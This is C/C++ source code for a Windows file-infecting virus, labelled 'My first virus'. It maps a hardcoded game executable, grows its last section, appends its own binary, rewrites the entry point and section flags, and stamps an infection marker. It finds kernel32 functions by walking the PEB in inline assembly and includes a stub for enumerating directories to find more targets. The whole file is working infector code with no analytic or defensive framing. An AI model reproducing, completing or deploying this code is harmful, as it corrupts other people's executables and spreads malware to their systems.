#include <Windows.h>
#include <stdio.h>
#include <conio.h>

#pragma comment(linker,"/MERGE:.rdata=.text")
#pragma comment(linker,"/FILEALIGN:512")
#pragma comment(linker,"/SECTION:.text,EWR /IGNORE:4078")
#pragma comment(linker,"/ENTRY:main")
/*
typedef wchar_t WCHAR;
typedef WCHAR *LPWSTR;
typedef unsigned char BYTE;
typedef unsigned short WORD;
typedef unsigned long DWORD;
typedef DWORD *LPDWORD;
typedef void *HANDLE;
typedef unsigned long __w64 ULONG_PTR;
typedef ULONG_PTR SIZE_T;
//typedef const WCHAR *LPWSTR;
typedef LPWSTR LPCWSTR;
typedef LPCWSTR LPCTSTR, LPTSTR;
typedef long LONG;
typedef LONG PLONG;
typedef const void *LPVOID, *LPCVOID;
typedef unsigned int UINT;
typedef int BOOL;
typedef BOOL *LPBOOL;
typedef char CHAR;
typedef CHAR *LPSTR;
typedef const CHAR *LPCSTR;
typedef void *PVOID;

#define IMAGE_NT_SIGNATURE 0x00004550
#define MAX_PATH 250
#define NULL 0

typedef struct _FILETIME {
  DWORD dwLowDateTime;
  DWORD dwHighDateTime;
} FILETIME; 

typedef struct _WIN32_FIND_DATA {
  DWORD dwFileAttributes;
  FILETIME ftCreationTime;
  FILETIME ftLastAccessTime;
  FILETIME ftLastWriteTime;
  DWORD nFileSizeHigh;
  DWORD nFileSizeLow;
  DWORD dwReserved0;
  DWORD dwReserved1;
  WCHAR cFileName[260];
  WCHAR cAlternateFileName[14];
} WIN32_FIND_DATA, *PWIN32_FIND_DATA, *LPWIN32_FIND_DATA;

typedef struct _SECURITY_ATTRIBUTES {
  DWORD  nLength;
  LPVOID lpSecurityDescriptor;
  BOOL   bInheritHandle;
} SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;

typedef struct _OVERLAPPED {
  ULONG_PTR Internal;
  ULONG_PTR InternalHigh;
  union {
    struct {
      DWORD Offset;
      DWORD OffsetHigh;
    };
    PVOID  Pointer;
  };
  HANDLE    hEvent;
} OVERLAPPED, *LPOVERLAPPED;

typedef struct HWND__ {int unused;};
typedef struct HWND__ *HWND;
*/
#define NTSIGNATURE(a) ((LPVOID)(*((DWORD *)(a + 0x3c)) + a))
#define GETSIZEOFHEADERS(a) (*((DWORD*)(a + 0x54)))
#define ALIGN_DOWN(x, align) (x & ~(align - 1))
#define ALIGN_UP(x, align) ((x & (align - 1))?ALIGN_DOWN(x,align)+align:x)
#define OPT_SZ(p) (*((WORD*)(p + 0x14)))
#define NumOfSec(p) (*(WORD*)(p + 0x6))
#define pSectionTable(p) ((BYTE*)(p + 0x18 + OPT_SZ(p)))
#define pLastSection(p) (pSectionTable(p) + (NumOfSec(p) - 1) * 0x28)

wchar_t* CharToWchar(char*);
char* WcharToChar(wchar_t*);
bool FindFiles();
DWORD FindFuncs(char *);
int StrCmp(char*, char*);
void GetAPIs();
int WcsCat(wchar_t *, wchar_t *);



HANDLE (__stdcall *create_file)(LPWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE); 
BOOL (__stdcall *close_handle)(HANDLE);
LPVOID (__stdcall *map_view_of_file)( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
HANDLE (__stdcall *create_file_mapping)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName);
DWORD (__stdcall *set_file_pointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
BOOL (__stdcall *unmap_view_of_file)(LPCVOID lpBaseAddress);
BOOL (__stdcall *read_file)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
BOOL (__stdcall *write_file)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
DWORD (__stdcall *get_current_directory)(DWORD nBufferLength, LPTSTR lpBuffer);
HANDLE (__stdcall *find_first_file)(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData);
BOOL (__stdcall *find_next_file)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData);
BOOL (__stdcall *find_close)(HANDLE hFindFile);
int (__stdcall *mb_to_wc)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
int (__stdcall *wc_to_mb)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
int (__stdcall *message_box)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
void (__stdcall *exit_process)(UINT);

int main(int argc, char *argv[])
{
	
	WIN32_FIND_DATA FindFileData;
	
	//Patient
	char chStr[38] = "c:\\Games\\LIMBO\\limbo.EXE";
	//HANDLE hFind = FindFirstFile(CharToWchar(chStr), &FindFileData);
	long w;
	GetAPIs();
	HANDLE hfPat = create_file(CharToWchar(chStr), 0xC0000000, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
	if((DWORD)hfPat == 0xffffffff) {printf("Open patient file error!"); close_handle(hfPat); return 0; }
	w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2

	HANDLE hMap = create_file_mapping(hfPat, NULL, 0x04, 0, w, NULL); //PAGE_READWRITE 0x04
	if(hMap==NULL) {printf("error - hMap"); close_handle(hfPat); return 0; }
	BYTE* hMapAddress = (BYTE*) map_view_of_file(hMap, 0x02, 0, 0, w);
	if(!hMapAddress) {printf("error - hMapAddress");return 0;}

	BYTE* hPE = (BYTE*)NTSIGNATURE(hMapAddress);

	if(*((DWORD*)(hPE)) == IMAGE_NT_SIGNATURE) printf("\nsucces");
	else printf("\nerror PE");

	DWORD AEP_PAT = *((DWORD*)(hPE + 0x28)), FA = *((DWORD*)(hPE + 0x3C)), IB = *((DWORD*)(hPE + 0x34)), SA = *((DWORD*)(hPE + 0x38));
	
	//Virus
	wchar_t m[MAX_PATH];
	GetModuleFileName(NULL, m, MAX_PATH);
	HANDLE hfVir = create_file(m, 0x80000000, 0x00000001, NULL, 3, 0x00000080, 0);
	if((DWORD)hfVir == 0xffffffff) {printf("Open vir file error!"); close_handle(hfVir); return 0; }
	DWORD vir_sz;
	vir_sz = set_file_pointer(hfVir, 0, 0, 2); //FILE_END 2
	HANDLE hMapVir = create_file_mapping(hfVir, NULL, 0x02, 0, vir_sz, NULL); //PAGE_READONLY 0x02
	if(hMapVir == NULL) {printf("error - hMap Vir"); close_handle(hfVir); return 0; }
	BYTE* hMapAddressVir = (BYTE*) map_view_of_file(hMapVir, 0x04, 0, 0, vir_sz);
	if(!hMapAddressVir) {printf("error - hMapAddress Vir"); return 0;}

	BYTE* hPEVir = (BYTE*)NTSIGNATURE(hMapAddressVir);

	if(*((DWORD*)(hPEVir)) == IMAGE_NT_SIGNATURE) printf("\nsucces Vir");
	else printf("\nerror PEVir");

	DWORD AEP_VIR = *((DWORD*)(hPEVir + 0x28)), IS_VIR = *((DWORD*)(hPEVir + 0x50));
	
	// Infection
	if(*((DWORD*)(hPE + 0x4C)) == 0x45673) {MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0); exit_process(NULL); }
	else
	{
	BYTE* hLS = pLastSection(hPE);
	DWORD charLS = *((DWORD*)(hLS + 0x24));	
	//printf("Attributes = %x",*((DWORD*)(hLS + 0x24)));
	DWORD szRD = *((DWORD*)(hLS + 0x10)), newszRD = 0;
	newszRD = szRD + vir_sz;
	//newszRD = ALIGN_UP(newszRD, FA);
	*((DWORD*)(hLS + 0x10)) = ALIGN_UP(newszRD, FA);
	DWORD dd = *((DWORD*)(hLS + 0x8));
	*((DWORD*)(hLS + 0x8)) = ALIGN_UP(newszRD,SA);
	DWORD ptrEndLS = szRD + *((DWORD*)(hLS + 0x14));
	/*
	w = set_file_pointer(hfPat, 0,0, 2);
	printf("sz_x = %x, R_sz_before = %x, R_sz_after = %x, V_sz_bef = %x, V_sz_aftr = %x, ptr = %x, File size = %x",vir_sz,szRD, *((DWORD*)(hLS + 0x10)),dd,*((DWORD*)(hLS + 0x8)),ptrEndLS, w);
	*/
	DWORD newAEP = szRD + *((DWORD*)(hLS + 0x0C));
	*((DWORD*)(hPE + 0x28)) = newAEP;
	
	
	// vnedrenie
		set_file_pointer(hfPat, ptrEndLS, 0, 0); //FILE_BEGIN 0
		set_file_pointer(hfVir, 0, 0, 0);

		DWORD wr;
		unsigned char buf[1024];
		while(1)
		{
			read_file(hfVir,buf, 1024, &wr, NULL);
			write_file(hfPat, buf, wr, &wr, NULL);
			if(wr < 1024) break;
		};
		*((DWORD*)(hPE + 0x4C)) = 0x45673;
		/*
		w = set_file_pointer(hfPat, 0,0, 2);
		printf("\nnews = %x, newsalign = %x, filesz = %x",newszRD, ALIGN_UP(newszRD,FA), w);
		*/
		*((DWORD*)(hLS + 0x24)) = 0xA0000020;
		*((DWORD*)(hPE + 0x50)) = *((DWORD*)(hLS + 0x0C)) + ALIGN_UP(newszRD,SA);
	}
	
	//*((DWORD*)(hPE + 0x34 + ptrEndLS)) = ptrEndLS;
	
	unmap_view_of_file(hMapAddress);
	close_handle(hfPat);
	unmap_view_of_file(hMapAddressVir);
	close_handle(hfVir);
	//if (!FindFiles()) return 0;
	getch();
	return 1;	

}

wchar_t* CharToWchar(char *temp)
{
	int len = 0;
	while(temp[len])
		len++;
	wchar_t *wStr = new wchar_t[len + 1];
	mb_to_wc(0, NULL, temp, -1, wStr, len);
	wStr[len] = 0;
	return wStr;
}

char* WcharToChar(wchar_t *temp)
{
	int len = 0;
	while(temp[len])
		len++;
	char *Str = new char[len + 1];
	wc_to_mb(1251, NULL, temp, -1, Str, len, NULL, NULL);
	Str[len] = '\0';
	//delete temp;
	return Str;
}

bool FindFiles()
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = NULL;//INVALID_HANDLE_VALUE;
    wchar_t DirSpec[MAX_PATH];  // directory specification
    DWORD dwError;
	DWORD BufSize = MAX_PATH;
    //path[strlen(path)-10] = '\0';

	
	get_current_directory(BufSize, DirSpec);
  //  printf ("\nTarget directory is %s\n", WcharToChar(DirSpec));
    //strncpy (DirSpec, path, strlen(path)+1);
    WcsCat(DirSpec, CharToWchar("\\*"));

    hFind = find_first_file(DirSpec, &FindFileData);

   /* if (hFind == INVALID_HANDLE_VALUE) 
    {
       printf ("Invalid file handle. Error is %u\n", GetLastError());
       return false;
    } 
    else 
    {*/
		//printf ("First file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
       while (find_next_file(hFind, &FindFileData) != 0) 
       {
         // printf ("Next file name is %s\nFile size = %x\n", WcharToChar(FindFileData.cFileName), FindFileData.nFileSizeLow);
       }
    
   //    dwError = GetLastError();
       find_close(hFind);
  /*     if (dwError != ERROR_NO_MORE_FILES) 
       {
          printf ("FindNextFile error. Error is %u\n", dwError);
          return false;
       }
    }*/
    return true;
}

DWORD FindFuncs(char *f_name)
{
	DWORD kernel;
		_asm
	{
		xor ebx, ebx               // clear ebx
		mov ebx, fs:[ 0x30 ]       // get a pointer to the PEB
		mov ebx, [ ebx + 0x0C ]    // get PEB->Ldr
	    mov ebx, [ ebx + 0x14 ]    // get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
		mov ebx, [ ebx ]           // get the next entry (2nd entry)
		mov ebx, [ ebx ]           // get the next entry (3rd entry)
		mov ebx, [ ebx + 0x10 ]    // get the 3rd entries base address (kernel32.dll)
		mov kernel, ebx
	}

	BYTE* p = (BYTE*)NTSIGNATURE(kernel);// + kernel);//*((DWORD*)(kernel + 0x3C)) + kernel;
	//printf("address = %d\nkernel = %d",LoadLibrary(CharToWchar("kernel32")), kernel);
	if(*((DWORD*)p) == IMAGE_NT_SIGNATURE) printf("\nOK %s", f_name);
	
	DWORD* pDD = (DWORD*)(p + 0x78);// pointer to Data Directory
	DWORD pExport = pDD[0] + kernel;
	DWORD xExport = pDD[1];//size
	
	//DWORD nameRVA = *(DWORD*)(pExport + 0xC) + kernel;
	//DWORD ordinalBASE = *(DWORD*)(pExport + 0x10);
	//DWORD addressTableEntries = *(DWORD*)(pExport + 0x14);
	DWORD numberOfNamePointers = *(DWORD*)(pExport + 0x18);
	DWORD* exportAddressTableRVA = (DWORD*)(*(DWORD*)(pExport + 0x1C) + kernel);
	DWORD* namePointerRVA = (DWORD*)(*(DWORD*)(pExport + 0x20) + kernel);
	WORD* ordinalTableRVA = (WORD*)(*(DWORD*)(pExport + 0x24) + kernel);

	char* name;
	//char f_name[] = "MultiByteToWideChar";
	DWORD f_index, f_address, ordinal;
	//BYTE* pForward;
	BYTE ind = 0;
	
	//printf("name             ordinal/hint VirtualAddress Forward\n"\
	//		"------------------------------------------------\n");

	for(int i = 0; i < numberOfNamePointers; i++)
	{
		name = (char*)(namePointerRVA[i] + kernel);
		if(!StrCmp(name, f_name)) ind = 1;
  		f_index = ordinalTableRVA[i];
		f_address = (DWORD)((long)exportAddressTableRVA[f_index] + kernel);
		if(f_address == kernel) continue;
		//ordinal = f_index + ordinalBASE;

		/*if((f_address > (DWORD)pExport) && (f_address < (DWORD)(pExport + xExport)))
			pForward = (BYTE*)f_address;
		else pForward = 0;

		if(ind){
			printf("% 20s [%03d/%03d] %08Xh %s\n",
			name, ordinal, i, f_address, (pForward)?(char*)pForward:"");
		printf("----------------------------------------------------");*/
		if(ind) {printf("addr = %x",f_address);return (f_address);}
	}
	return 0;
}

void GetAPIs()
{
	create_file = (HANDLE (__stdcall *)(LPWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))FindFuncs("CreateFileW");
	map_view_of_file = (LPVOID (__stdcall *)( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap))FindFuncs("MapViewOfFile");
	create_file_mapping = (HANDLE (__stdcall *)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCTSTR lpName))FindFuncs("CreateFileMappingW");
	close_handle = (BOOL (__stdcall*)(HANDLE))FindFuncs("CloseHandle");
	set_file_pointer = (DWORD (__stdcall *)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod))FindFuncs("SetFilePointer");
	unmap_view_of_file = (BOOL (__stdcall *)(LPCVOID lpBaseAddress))FindFuncs("UnmapViewOfFile");
	read_file = (BOOL (__stdcall *)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped))FindFuncs("ReadFile");
	write_file = (BOOL (__stdcall *)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped))FindFuncs("WriteFile");
	mb_to_wc = (int (__stdcall *)(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar))FindFuncs("MultiByteToWideChar");
	wc_to_mb = (int (__stdcall *)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar))FindFuncs("WideCharToMultiByte");
	get_current_directory = (DWORD (__stdcall *)(DWORD nBufferLength, LPTSTR lpBuffer))FindFuncs("GetCurrentDirectoryW");
	find_first_file = (HANDLE (__stdcall *)(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData))FindFuncs("FindFirstFileW");
	find_next_file = (BOOL (__stdcall *)(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData))FindFuncs("FindNextFileW");
	find_close = (BOOL (__stdcall *)(HANDLE hFindFile))FindFuncs("FindClose");
	message_box = (int (__stdcall *)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType))FindFuncs("MESSAGEBOX");
	exit_process = (void (__stdcall *)(UINT))FindFuncs("ExitProcess");
}

int StrCmp(char *str1, char *str2)
{
	int i = 0;
	while((str1[i] == str2[i]) && (str1[i] != '\0')) i++;
	if(str1[i] == '\0') return 0;
	else return 1;
}

int WcsCat(wchar_t *dest, wchar_t *source)
{
	int i= 0, j = 0;
	while(dest[i]) i++;
	while(source[j]) {dest[i] = source[j]; j++; i++;}
	dest[i] = 0;
	return 1;
}